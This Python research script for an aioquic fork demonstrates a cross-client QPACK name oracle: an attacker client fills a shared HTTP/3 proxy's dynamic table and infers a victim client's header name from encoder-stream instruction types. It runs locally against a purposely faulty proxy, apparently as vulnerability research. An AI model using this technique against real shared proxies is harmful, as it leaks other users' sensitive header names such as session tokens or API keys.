"""Cross-client QPACK name oracle via encoder-stream instruction side-channel.

Demonstrates that an attacker client (A) can identify the header name sent by a
victim client (B) through the same HTTP/3 proxy, by observing whether the proxy
emits insert_name_ref vs insert_literal encoder-stream instructions.

How the attack works
--------------------
  Phases 1–3 are identical to cross_client_size_probe: Client A fills the
  shared QPACK dynamic table, Client B inserts a secret header, Client A
  performs a backward scan to confirm the insertion occurred.

  Phase 4 — Name oracle:
    The attacker assumes the victim's header name comes from a known pool of
    N candidates.  For each candidate Client A sends:

        (candidate_name, ORACLE_PROBE_VALUE)

    through the proxy.  Because the proxy shares one QPACK encoder across all
    frontend clients, it checks its own dynamic table for candidate_name:

      • If candidate_name IS in the dynamic table (victim already inserted it):
            proxy emits  insert_name_ref(idx, ORACLE_PROBE_VALUE)   ← MATCH
      • If candidate_name is NOT in the table:
            proxy emits  insert_literal(candidate_name, ORACLE_PROBE_VALUE) ← miss

    Client A detects the difference by checking the echo-server's encoder-stream
    log for a new insert_literal bearing candidate_name.  The first candidate
    that does NOT produce a new insert_literal is the victim's header name.

QPACK instruction types (RFC 9204 §3.2)
-----------------------------------------
  insert_name_ref  : Insert-With-Name-Reference — name already indexed in table
  insert_literal   : Insert-With-Literal-Name   — name is new to the table

Usage
-----
    cd aioquic_99
    python -m research.experiments.cross_client_name_oracle
        [--table-capacity N] [--victim-name NAME] [--victim-value VALUE]

Examples
--------
    python -m research.experiments.cross_client_name_oracle
    python -m research.experiments.cross_client_name_oracle --table-capacity 512 \\
        --victim-name x-user-id --victim-value abc123
"""

from __future__ import annotations

import argparse
import asyncio
import itertools
import os
import random
import string
import sys
import socket
import ssl
from collections import deque
from typing import Generator

_HERE = os.path.dirname(os.path.abspath(__file__))
_REPO_ROOT = os.path.abspath(os.path.join(_HERE, "..", ".."))
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)

from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN, H3Connection, Setting
from aioquic.h3.events import H3Event
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.connection import QuicConnection
from aioquic.quic.events import QuicEvent

from research.echo_server import EchoServer, EncStreamRecord
from research.faulty_proxy import FaultyProxy
from research.qpack_manual import ENTRY_OVERHEAD

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

CERT = os.path.join(_HERE, "..", "..", "tests", "ssl_cert.pem")
KEY  = os.path.join(_HERE, "..", "..", "tests", "ssl_key.pem")

# Canary: smallest possible QPACK entry (1-byte name, empty value = 33 bytes).
CANARY_NAME  = b"z"
CANARY_VALUE = b""

# Value used when probing candidate names in Phase 4 — empty to keep probes
# as small as possible and avoid any static-table exact-match.
ORACLE_PROBE_VALUE = b""

# Pool of candidate header names the victim is assumed to choose from.
NAME_POOL: list[bytes] = [
    b"x-session-token",
    b"x-api-key",
    b"x-user-id",
    b"x-request-id",
    b"x-correlation-id",
    b"x-tenant-id",
    b"x-client-id",
    b"x-trace-id",
]

# ---------------------------------------------------------------------------
# Table sizing — graduated fillers (identical to cross_client_size_probe)
# ---------------------------------------------------------------------------


def _entry_size(name: bytes, value: bytes) -> int:
    return len(name) + len(value) + ENTRY_OVERHEAD


def _filler_name_gen() -> Generator[bytes, None, None]:
    """Yield unique filler names in increasing-length order, excluding CANARY_NAME."""
    for length in itertools.count(1):
        for chars in itertools.product(string.ascii_lowercase, repeat=length):
            name = "".join(chars).encode()
            if name != CANARY_NAME:
                yield name


def _compute_fillers(
    table_capacity: int,
) -> tuple[list[tuple[bytes, bytes]], int]:
    """Return (fillers, leftover_bytes).

    fillers ordered oldest (index 0, smallest) → newest (index -1, largest).
    All values are b"".  The final entry is size-adjusted for LEFTOVER = 0.
    """
    canary_size = _entry_size(CANARY_NAME, CANARY_VALUE)
    remaining   = table_capacity - canary_size
    fillers: list[tuple[bytes, bytes]] = []
    used: set[bytes] = {CANARY_NAME}

    for name in _filler_name_gen():
        size  = len(name) + ENTRY_OVERHEAD
        after = remaining - size

        if size > remaining:
            break

        if 0 < after < ENTRY_OVERHEAD + 1:
            break

        fillers.append((name, b""))
        used.add(name)
        remaining -= size

        if remaining == 0:
            return fillers, 0

    if remaining >= ENTRY_OVERHEAD + 1:
        exact_len = remaining - ENTRY_OVERHEAD
        for chars in itertools.product(string.ascii_lowercase, repeat=exact_len):
            cname = "".join(chars).encode()
            if cname not in used:
                fillers.append((cname, b""))
                remaining = 0
                break

    return fillers, remaining


# ---------------------------------------------------------------------------
# Encoder-stream helpers
# ---------------------------------------------------------------------------


def _count_literal_insertions(
    enc_log: list[EncStreamRecord], name: bytes, value: bytes
) -> int:
    """Count insert_literal instructions matching (name, value) in enc_log."""
    count = 0
    for record in enc_log:
        for instr in record.instructions:
            if (
                instr[0] == "insert_literal"
                and instr[1] == name
                and instr[2] == value
            ):
                count += 1
    return count


def _count_name_ref_insertions(enc_log: list[EncStreamRecord]) -> int:
    """Count all insert_name_ref instructions in enc_log."""
    count = 0
    for record in enc_log:
        for instr in record.instructions:
            if instr[0] == "insert_name_ref":
                count += 1
    return count


# ---------------------------------------------------------------------------
# Minimal HTTP/3 client (zero dynamic table)
# ---------------------------------------------------------------------------


class _ZeroCapEncoder:
    """Forces 0-capacity table settings so the client never uses its own table."""

    def __init__(self, real) -> None:
        object.__setattr__(self, "_real", real)

    def apply_settings(self, *args, **kwargs) -> bytes:  # noqa: ARG002
        return self._real.apply_settings(0, 0)

    def feed_decoder(self, *args, **kwargs) -> None:  # noqa: ARG002
        pass

    def __getattr__(self, name: str):
        return getattr(self._real, name)


class _NoTableH3Connection(H3Connection):
    def __init__(self, quic) -> None:
        super().__init__(quic)
        self._encoder = _ZeroCapEncoder(self._encoder)

    def _get_local_settings(self) -> dict:
        settings = super()._get_local_settings()
        settings[Setting.QPACK_MAX_TABLE_CAPACITY] = 0
        settings[Setting.QPACK_BLOCKED_STREAMS] = 0
        return settings


class _H3Client(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._request_events: dict[int, deque[H3Event]] = {}
        self._request_waiters: dict[int, asyncio.Future] = {}
        self._http: H3Connection = _NoTableH3Connection(self._quic)

    def quic_event_received(self, event: QuicEvent) -> None:
        for h3ev in self._http.handle_event(event):
            sid = h3ev.stream_id  # type: ignore[attr-defined]
            self._request_events.setdefault(sid, deque()).append(h3ev)
            if getattr(h3ev, "stream_ended", False) and sid in self._request_waiters:
                waiter = self._request_waiters.pop(sid)
                if not waiter.done():
                    waiter.set_result(self._request_events.pop(sid))

    async def get(
        self,
        host: str,
        port: int,
        path: str,
        extra_headers: list[tuple[bytes, bytes]] | None = None,
    ) -> deque[H3Event]:
        headers = [
            (b":method",    b"GET"),
            (b":scheme",    b"https"),
            (b":authority", f"{host}:{port}".encode()),
            (b":path",      path.encode()),
        ]
        if extra_headers:
            headers.extend(extra_headers)
        sid = self._quic.get_next_available_stream_id()
        self._http.send_headers(stream_id=sid, headers=headers, end_stream=True)
        waiter = self._loop.create_future()
        self._request_events[sid] = deque()
        self._request_waiters[sid] = waiter
        self.transmit()
        return await asyncio.wait_for(asyncio.shield(waiter), timeout=10.0)


async def _connect_client(
    host: str, port: int
) -> tuple[_H3Client, asyncio.BaseTransport]:
    loop = asyncio.get_running_loop()
    infos = await loop.getaddrinfo(host, port, type=socket.SOCK_DGRAM)
    addr = infos[0][4]
    if len(addr) == 2:
        addr = ("::ffff:" + addr[0], addr[1], 0, 0)

    config = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    config.verify_mode = ssl.CERT_NONE
    config.server_name = host

    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        sock.bind(("::", 0, 0, 0))
    except Exception:
        sock.close()
        raise

    transport, protocol = await loop.create_datagram_endpoint(
        lambda: _H3Client(QuicConnection(configuration=config)),
        sock=sock,
    )
    protocol.connect(addr)
    await protocol.wait_connected()
    return protocol, transport


# ---------------------------------------------------------------------------
# Experiment
# ---------------------------------------------------------------------------


async def run(
    table_capacity: int,
    victim_name: bytes,
    victim_value: bytes,
) -> None:
    canary_size = _entry_size(CANARY_NAME, CANARY_VALUE)
    fillers, leftover = _compute_fillers(table_capacity)

    if not fillers:
        min_filler = 1 + ENTRY_OVERHEAD
        print(
            f"ERROR: table_capacity={table_capacity} is too small to hold canary "
            f"({canary_size} bytes) plus any filler ({min_filler} bytes).  "
            f"Minimum table size: {canary_size + min_filler} bytes."
        )
        return

    if victim_name not in NAME_POOL:
        print(
            f"ERROR: --victim-name {victim_name.decode()!r} is not in NAME_POOL.\n"
            f"Valid names: {[n.decode() for n in NAME_POOL]}"
        )
        return

    filler_sizes = [len(name) + ENTRY_OVERHEAD for name, _ in fillers]
    cumsum       = list(itertools.accumulate(filler_sizes))
    total_filler = cumsum[-1]
    used_bytes   = canary_size + total_filler

    victim_entry_size = _entry_size(victim_name, victim_value)

    W = 78
    print("=" * W)
    print(f"CROSS-CLIENT QPACK NAME ORACLE  (table={table_capacity} bytes)")
    print("=" * W)
    print()
    print("Table layout (attacker's view):")
    print(f"  Canary  : {CANARY_NAME.decode()!r:25s}  {canary_size:4d} bytes")
    print(f"  Fillers : {len(fillers)} entries, sizes "
          f"{min(filler_sizes)}–{max(filler_sizes)} bytes  "
          f"(graduated, oldest = smallest, all empty-value)")
    print(f"  Total   : {used_bytes}/{table_capacity} bytes used  "
          f"({leftover} bytes leftover)")
    print()
    print(f"Candidate name pool ({len(NAME_POOL)} names):")
    for n in NAME_POOL:
        marker = "  ← victim (unknown to attacker)" if n == victim_name else ""
        print(f"  {n.decode()}{marker}")
    print()
    print(f"Victim header (unknown to attacker):")
    print(f"  {victim_name.decode()}: {victim_value.decode()}")
    print(f"  QPACK entry size : {victim_entry_size} bytes")
    print()

    # ── Infrastructure setup ──────────────────────────────────────────────────
    server = EchoServer()
    proxy  = FaultyProxy(table_capacity=table_capacity)
    echo_port  = await server.start(cert_file=CERT, key_file=KEY)
    proxy_port = await proxy.start(
        listen_port=0,
        backend_host="localhost",
        backend_port=echo_port,
        cert_file=CERT,
        key_file=KEY,
    )

    client_a, transport_a = await _connect_client("localhost", proxy_port)
    client_b, transport_b = await _connect_client("localhost", proxy_port)

    try:
        # ── Phase 1: Setup ────────────────────────────────────────────────────
        print("Phase 1: Setup  [Client A fills the shared table]")
        print("─" * W)

        await client_a.get("localhost", proxy_port, "/setup/canary",
                           extra_headers=[(CANARY_NAME, CANARY_VALUE)])
        if _count_literal_insertions(server.get_enc_log(), CANARY_NAME, CANARY_VALUE) != 1:
            print("  ERROR: canary not confirmed in encoder stream. Aborting.")
            return
        print(f"  [1/2] Canary: {CANARY_NAME.decode()!r} = {CANARY_VALUE.decode()!r}  "
              f"({canary_size} bytes)")

        for i, (fname, fval) in enumerate(fillers):
            await client_a.get("localhost", proxy_port, f"/setup/filler/{i}",
                               extra_headers=[(fname, fval)])

        print(f"  [2/2] Fillers: {len(fillers)} entries  "
              f"({fillers[0][0].decode()!r}…{fillers[-1][0].decode()!r})  "
              f"sizes {min(filler_sizes)}–{max(filler_sizes)} B  =  {total_filler} bytes")
        print(f"        Table : {used_bytes}/{table_capacity} bytes used  "
              f"({leftover} bytes free)")
        print()

        # ── Phase 2: Victim ───────────────────────────────────────────────────
        print("Phase 2: Victim  [Client B sends mystery header through shared proxy]")
        print("─" * W)

        if victim_entry_size > table_capacity:
            print(f"  WARNING: victim entry ({victim_entry_size} bytes) exceeds table capacity "
                  f"({table_capacity} bytes).  Proxy will NOT insert it.")
            return

        enc_before = _count_literal_insertions(server.get_enc_log(), victim_name, victim_value)
        await client_b.get("localhost", proxy_port, "/victim/request",
                           extra_headers=[(victim_name, victim_value)])
        enc_after = _count_literal_insertions(server.get_enc_log(), victim_name, victim_value)

        if enc_after <= enc_before:
            print(f"  WARNING: victim header was not inserted by the proxy.")
            return

        print(f"  Victim header forwarded; proxy inserted into shared table.")
        print()

        # ── Phase 3: Eviction probe ───────────────────────────────────────────
        print("Phase 3: Eviction probe  [confirm victim's insertion via eviction]")
        print("─" * W)

        evicted_boundary: int | None = None
        probes_sent = 0

        for j in range(len(fillers) - 1, -1, -1):
            fname, fval = fillers[j]
            cnt_before = _count_literal_insertions(server.get_enc_log(), fname, fval)
            await client_a.get("localhost", proxy_port, f"/probe/filler/{j}",
                               extra_headers=[(fname, fval)])
            cnt_after = _count_literal_insertions(server.get_enc_log(), fname, fval)
            probes_sent += 1

            if cnt_after > cnt_before:
                hits_above = len(fillers) - 1 - j
                if hits_above:
                    print(f"  hit   [{len(fillers)-1}..{j+1}]  "
                          f"({hits_above} entr{'y' if hits_above == 1 else 'ies'} "
                          f"still in table)")
                print(f"  MISS  [{j}] {fname.decode()!r}  ({filler_sizes[j]} B)  "
                      f"← eviction boundary confirmed  ({probes_sent} probe(s) sent)")
                evicted_boundary = j
                break

        only_canary_evicted = False
        if evicted_boundary is None:
            if fillers:
                print(f"  hit   [all {len(fillers)} fillers]  (all still in table)")
            can_before = _count_literal_insertions(server.get_enc_log(), CANARY_NAME, CANARY_VALUE)
            await client_a.get("localhost", proxy_port, "/probe/canary",
                               extra_headers=[(CANARY_NAME, CANARY_VALUE)])
            can_after = _count_literal_insertions(server.get_enc_log(), CANARY_NAME, CANARY_VALUE)
            probes_sent += 1

            if can_after > can_before:
                only_canary_evicted = True
                print(f"  MISS  canary {CANARY_NAME.decode()!r}  ({canary_size} B)  "
                      f"← eviction boundary confirmed  ({probes_sent} probe(s) sent)")
            else:
                print(f"  hit   canary  (nothing evicted — victim fit in leftover space)")

        insertion_confirmed = evicted_boundary is not None or only_canary_evicted
        print()

        if not insertion_confirmed:
            print("  NOTE: no eviction detected.  Victim entry may have fit in leftover "
                  "space or was not inserted.  Name oracle may produce false positives.")
            print()

        # ── Phase 4: Name oracle ──────────────────────────────────────────────
        print("Phase 4: Name oracle  [probe each candidate for insert_name_ref signal]")
        print("─" * W)
        print(f"  Probe value : {ORACLE_PROBE_VALUE!r}  (empty — minimises entry size)")
        print(f"  Signal      : insert_literal → name NOT in table (miss)")
        print(f"                insert_name_ref → name IS in table  (MATCH)")
        print()

        identified_name: bytes | None = None
        probes_oracle = 0

        for candidate in NAME_POOL:
            lit_before   = _count_literal_insertions(
                server.get_enc_log(), candidate, ORACLE_PROBE_VALUE
            )
            nameref_before = _count_name_ref_insertions(server.get_enc_log())

            await client_a.get(
                "localhost", proxy_port, f"/oracle/{candidate.decode()}",
                extra_headers=[(candidate, ORACLE_PROBE_VALUE)],
            )
            probes_oracle += 1

            lit_after    = _count_literal_insertions(
                server.get_enc_log(), candidate, ORACLE_PROBE_VALUE
            )
            nameref_after = _count_name_ref_insertions(server.get_enc_log())

            new_literals = lit_after - lit_before
            new_namerefs = nameref_after - nameref_before

            if new_literals > 0:
                print(f"  miss   {candidate.decode():<20s}  insert_literal  "
                      f"(name not in table)")
            else:
                # No new insert_literal for this name — proxy used insert_name_ref
                print(f"  MATCH  {candidate.decode():<20s}  insert_name_ref  "
                      f"(name IS in table)  ← {probes_oracle} probe(s) sent")
                identified_name = candidate
                break

        print()

        # ── Result ────────────────────────────────────────────────────────────
        print("Result")
        print("─" * W)

        if identified_name is not None:
            correct = identified_name == victim_name
            print(f"  Identified name : {identified_name.decode()}")
            print(f"  Actual name     : {victim_name.decode()}")
            print(f"  Correct         : {'YES  (oracle correct)' if correct else 'NO  ← false positive'}")
            print(f"  Probes used     : {probes_sent} (eviction) + {probes_oracle} (name oracle)"
                  f"  =  {probes_sent + probes_oracle} total")
        else:
            print(f"  No match found in {len(NAME_POOL)}-name pool after {probes_oracle} probe(s).")
            print(f"  Actual name: {victim_name.decode()}")
            print("  Possible cause: victim's entry was evicted before name oracle ran.")
        print()

    finally:
        client_a.close()
        transport_a.close()
        client_b.close()
        transport_b.close()
        proxy.stop()
        server.close()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


_VALUE_CHARS = string.ascii_letters + string.digits


def main() -> None:
    default_name  = random.choice(NAME_POOL).decode()
    default_value = "".join(random.choices(_VALUE_CHARS, k=random.randint(10, 30)))

    parser = argparse.ArgumentParser(
        description="QPACK cross-client header-name oracle via encoder-stream side-channel",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  python -m research.experiments.cross_client_name_oracle
  python -m research.experiments.cross_client_name_oracle --table-capacity 512
  python -m research.experiments.cross_client_name_oracle \\
      --victim-name x-user-id --victim-value abc123
        """,
    )
    parser.add_argument(
        "--table-capacity",
        type=int,
        default=4096,
        help="QPACK dynamic table capacity in bytes (default: 4096)",
    )
    parser.add_argument(
        "--victim-name",
        default=default_name,
        help=f"Victim header name — must be one of the {len(NAME_POOL)} pool candidates "
             f"(default: random)",
    )
    parser.add_argument(
        "--victim-value",
        default=default_value,
        help="Victim header value (default: random 10-30 char alphanumeric string)",
    )
    args = parser.parse_args()
    asyncio.run(run(
        table_capacity=args.table_capacity,
        victim_name=args.victim_name.encode(),
        victim_value=args.victim_value.encode(),
    ))


if __name__ == "__main__":
    main()
